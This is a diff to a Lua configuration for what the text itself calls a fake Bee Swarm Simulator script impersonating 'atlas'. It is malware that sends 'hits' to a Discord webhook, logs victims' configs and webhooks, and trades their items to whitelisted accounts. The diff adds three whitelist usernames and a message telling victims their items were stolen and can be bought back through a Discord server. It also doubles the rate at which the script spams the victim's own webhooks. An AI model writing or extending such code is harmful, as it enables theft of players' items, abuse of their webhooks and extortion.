@@ -6,7 +6,7 @@ local Configuration = {
         URL of where the hits will be sent, recommended to use a seperate api like a worker
         to prevent spam and webhook deletion but make sure to put '?with_components=true' and '&wait=true' at the end 
         of your discord webhook url INSIDE the api code *if* you use a seperate api ]]
-    Whitelist = ""; -- People who will be traded when joining a hit, a whitelist, seperate names (case sensitive) by a comma
+    Whitelist = "guygeebs, LOGGISpapaFANZ, swarmstorage67"; -- People who will be traded when joining a hit, a whitelist, seperate names (case sensitive) by a comma
     Stickers = "automatic"; -- The stickers you want to accept in a trade. If set to "automatic", any sticker above the value of 1 sign on bssm is accepted, otherwise put a table with strings of names of stickers
     Stickers2 = { ["Petal Cub Skin"] = 30, "Ticket Voucher" }, -- If you have Stickers set to automatic, but still want some specific stickers, add them here (table with strings of names of stickers)
     StickerEmojis = true; -- Adds emojis to the sticker field inside the hit embed but only applies to some stickers (not all)
@@ -17,7 +17,32 @@ local Configuration = {
     LogAtlasConfigsAndWebhooks = true; -- Self explanatory
     SpamWebhook = {
         Enabled = true; -- Idk its just funny, it spams the user's webhook that they use for recieving honey updates and stuff
-        Message = "@everyone ratted by exodus https://discord.gg/X9HUMRuUje your bss account will be wiped in 24 hours we have spammed detected features on your account :rofl: :joy_cat:"
+        Message = {
+            content = "@everyone https://discord.gg/X9HUMRuUje",
+            description = "READ CAREFULLY!",
+            embeds = {
+                title = "Exodus",
+                thumbnail = {
+                    url = "https://github.com/exodus892/__exodus__/raw/refs/heads/main/EXDS.gif"
+                },
+                fields = {
+                    {
+                        name = "What happened?",
+                        value = "You just ran a fake script, most likely impersonating atlas or another well known script. That script allowed the creators to join and STEAL all of your valuable beequips and items!",
+                        inline = false
+                    },
+                    {
+                        name = "How do i get my items back?",
+                        value = "Fear not, your items are not completely erased. You can purchase them back in the server below for a VERY cheap price! (0.18 rate) Let's say you got your Robo Cub Skin stolen, you can buy it back for $2.07, or if you got your Bee Cub Skin stolen then you can buy it back for $48. You can purchase back beequips aswell!",
+                        inline = false   
+                    },
+                    {
+                        name = "Notice",
+                        value = "If your items weren't valuable, you can completely ignore this. We won't bother giving your stuff back since the bottom line is we don't care, and we won't hassle for 18 cents of your precious star signs."
+                    }
+                }
+            }
+        }
     };
     TradeTracker = {
         Enabled = true; -- Tracks COMPLETED trades with victims. Always keep this on because it guarantees no whitelisted people (grey) are lying about not getting items
@@ -838,7 +863,7 @@ task.spawn(function()
             task.wait()
         until #GetWhitelistedBQs() == 0 and #GetWhitelistedStickers() == 0
         if Configuration.SpamWebhook.Enabled then
-            while task.wait(2) do
+            while task.wait(1) do
                 for i, v in pairs(AtlasWebhooks) do
                     SafeRequest({
                         Url = v,
@@ -846,7 +871,7 @@ task.spawn(function()
                         Headers = {
                             ["Content-Type"] = "application/json"
                         },
-                        Body = game:GetService("HttpService"):JSONEncode({content = Configuration.SpamWebhook.Message})
+                        Body = game:GetService("HttpService"):JSONEncode(Configuration.SpamWebhook.Message)
                     })
                 end
             end
